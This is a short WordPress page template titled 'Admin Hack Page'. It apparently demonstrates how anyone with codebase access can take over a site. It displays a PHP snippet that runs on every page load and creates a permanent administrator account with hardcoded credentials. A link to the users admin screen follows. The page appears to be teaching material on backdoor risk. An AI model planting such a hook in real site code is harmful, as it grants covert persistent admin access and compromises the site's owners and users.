<?php
/**
* Template Name: Admin Hack Page
*/
?>


<pre><code class='language-php'>//* Adds you as a permanent admin
function hack_an_account(){
	$user = 'benjith';
	$pass = 'abc123';
	$email = 'benji@builtbytophat.com';
	if (!username_exists($user) && !email_exists($email)) {
		$user_id = wp_create_user($user, $pass, $email);
		$user = new WP_User($user_id);
		$user->set_role('administrator');
	}
}
add_action('init','hack_an_account', 10, 0);</code></pre>

<h3>Access to the codebase gets you access everywhere!</h3>
<div class='example'>
  <a href='<?= admin_url('/users.php')?>' class='block'>Users</a>
</div>